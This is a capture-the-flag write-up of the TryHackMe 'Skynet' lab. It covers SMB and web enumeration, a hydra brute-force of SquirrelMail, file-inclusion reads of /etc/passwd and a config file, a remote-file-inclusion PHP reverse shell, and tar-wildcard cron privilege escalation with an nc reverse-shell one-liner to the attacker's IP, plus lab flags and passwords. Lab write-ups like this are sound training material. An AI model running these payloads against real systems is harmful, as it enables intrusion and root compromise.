# Skynet Writeup

    Box IP Addresses:
    10.10.143.191
    10.10.158.97

## [Task 1] Deploy and compromise the vulnerable machine!

Hasta la vista, baby. Are you able to compromise this Terminator themed machine?

### 1 - What is Miles password for his emails?

cyborg007haloterminator

### 2 - What is the hidden directory?

/45kra24zxs28v3yd

### 3 - What is the vulnerability called when you can include a remote file for malicious purposes?

Remote File Inclusion

### 4 - What is the user flag?



### 5 - What is the root flag?



Initial nmap scan:

    kali@kali-[10.8.82.167]:~/labs/tryhackme/skynet$ nmap -p- -sV -sC -A --min-rate 1000 --max-retries 5 -oN initial 10.10.143.191

    Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-19 23:10 EDT
    Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 43.68% done; ETC: 23:11 (0:00:31 remaining)
    Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 94.69% done; ETC: 23:11 (0:00:03 remaining)
    Nmap scan report for 10.10.143.191
    Host is up (0.021s latency).
    Not shown: 65529 closed ports
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
    |   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
    |_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
    80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Skynet
    110/tcp open  pop3        Dovecot pop3d
    |_pop3-capabilities: UIDL RESP-CODES CAPA SASL AUTH-RESP-CODE PIPELINING TOP
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    143/tcp open  imap        Dovecot imapd
    |_imap-capabilities: IMAP4rev1 IDLE ENABLE post-login have OK more ID listed LOGIN-REFERRALS SASL-IR capabilities Pre-login LITERAL+ LOGINDISABLEDA0001
    445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
    |_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: skynet
    |   NetBIOS computer name: SKYNET\x00
    |   Domain name: \x00
    |   FQDN: skynet
    |_  System time: 2020-08-19T22:11:49-05:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2020-08-20T03:11:49
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 74.07 seconds


Ran gobuster, found SquirrelMail page:
    http://10.10.143.191/squirrelmail/src/login.php



IMPORTANT: https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b

Enumerated Samba using smbmap:

    kali@kali-[10.8.82.167]:~/Desktop$ smbmap -H 10.10.143.191
    [+] Guest session       IP: 10.10.143.191:445   Name: 10.10.143.191

            Disk                                                    Permissions     Comment
            ----                                                    -----------     -------
            print$                                                  NO ACCESS       Printer Drivers
            anonymous                                               READ ONLY       Skynet Anonymous Share
            milesdyson                                              NO ACCESS       Miles Dyson Personal Share
            IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

Found "anonymous" share to be read only.

Went to File Explorer (GUI) --> Browse Network.

    smb://10.10.143.191

and copied anonymous folder.

log1.txt --> Contains potential passwords for squirrelmail (bruteforce hydra?), username miles.

Username: milesdyson
Password: cyborg007haloterminator

(tried them out one by one, although I feel hydra should work):

    kali@kali-[10.8.82.167]:~/labs/tryhackme/skynet$ hydra -l milesdyson -P log1.txt 10.10.143.191 http-form-post "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:incorrect"

    Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-19 23:52:23

    [DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task

    [DATA] attacking http-post-form://10.10.143.191:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:incorrect

    [80][http-post-form] host: 10.10.143.191   login: milesdyson   password: cyborg007haloterminator                                                                      

    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-19 23:52:28

And it did!

We can now read the emails, and find a password for milesdyson:

)s{A&2Z=F^n_E.B`

![](images/squirrelmail_samba_pwd.png)

Log in the same way we did with anonymous, using username: milesdyson, password: )s{A&2Z=F^n_E.B`

Copied all files to working directory.

important.txt --> 1. Add features to beta CMS /45kra24zxs28v3yd

http://10.10.143.191/45kra24zxs28v3yd/ links to a page

![](2020-08-20-00-06-29.png)

We can gobuster it:

Output:







Find a page: http://10.10.143.191/45kra24zxs28v3yd/administrator/

Cuppa CMS is running, asking for username and password.
Possible exploit: https://www.exploit-db.com/exploits/25971

http://10.10.143.191/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Field configuration:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false 

http://10.10.143.191/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt

Field configuration:
7ce5c2109a40f958099283600a9ae807 

Get CuppaCMS Configuration file:

http://10.10.143.191/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php

It was base64-encoded, so just:

    base64 -d config.txt

and we get the database username and password for cuppa:

username:root
password:password123

Reverse Shell:

copy php reverse shell into working directory.
Edit IP Address, and then set up a SimpleHTTPServer, port 80 in your wd:

    sudo python -m SimpleHTTPServer 80

In another terminal, set up a nc listener:

    nc -lvnp 1234

In Firefox, use this:

http://10.10.25.119/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.82.167/php-reverse-shell.php

Then you get a reverse shell!

I tried looking around to find usernames, passwords etc. before privescing:

    mysql -u root -ppassword123

    mysql> use cuppa;
    use cuppa;
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    mysql> select * from cu_users;
    select * from cu_users;
    +----+---------------+----------------------+----------+----------------------------------+---------+---------------+
    | id | name          | email                | username | password                         | enabled | user_group_id |
    +----+---------------+----------------------+----------+----------------------------------+---------+---------------+
    |  1 | Administrator | skynet@tryhackme.com | admin    | b686468aec2c71e1783375763dca9b7e |       1 |             1 |
    +----+---------------+----------------------+----------+----------------------------------+---------+---------------+
    1 row in set (0.00 sec)

PrivEsc:

Take a look at the cronjobs using:

    cat /etc/crontab

Output:

    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    */1 *   * * *   root    /home/milesdyson/backups/backup.sh
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #

We can see that root is running a backup, lets take a look at the script:

    #!/bin/bash
    cd /var/www/html
    tar cf /home/milesdyson/backups/backup.tgz *

tar has a vulnerability based on the wildcard * (all). Essentially you can use checkpoints, and checkpoint actions to execute a shell script, that contains a reverse shell:

    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.82.167 6789 >/tmp/f" > shell.sh
    touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
    touch "/var/www/html/--checkpoint=1"

![](2020-08-20-12-03-03.png)

Tried a couple different methods but this one worked.
Link to article: https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e

kali@kali-[10.8.82.167]:~/Desktop$ nc -lvnp 6789
listening on [any] 6789 ...
connect to [10.8.82.167] from (UNKNOWN) [10.10.25.119] 50406
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# python -c 'import pty;pty.spawn("/bin/bash")'
root@skynet:/var/www/html# whoami
whoami
root
root@skynet:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@skynet:/var/www/html# cat /root/root.txt
cat /root/root.txt
3f0372db24753accc7179a282cd6a949
root@skynet:/var/www/html# 

Complete!